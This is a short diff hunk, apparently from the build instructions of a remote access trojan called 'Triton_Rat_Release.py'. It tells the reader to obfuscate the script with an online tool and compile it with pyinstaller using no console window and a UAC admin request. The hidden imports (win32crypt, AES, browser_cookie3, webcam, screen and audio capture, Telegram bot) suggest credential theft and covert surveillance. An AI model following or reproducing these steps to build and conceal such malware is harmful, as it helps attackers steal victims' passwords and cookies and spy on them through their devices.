@@ -66,7 +66,7 @@ $ to obfuscate that script copy full code and paste it in https://freecodingtool
 $ https://freecodingtools.org/py-obfuscator
 
 
-# aftervdownloading pyinstaller run:
+# after downloading pyinstaller run:
 $ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import browser_cookie3 --hidden-import pyttsx3 Triton_Rat_Release.py
 
 
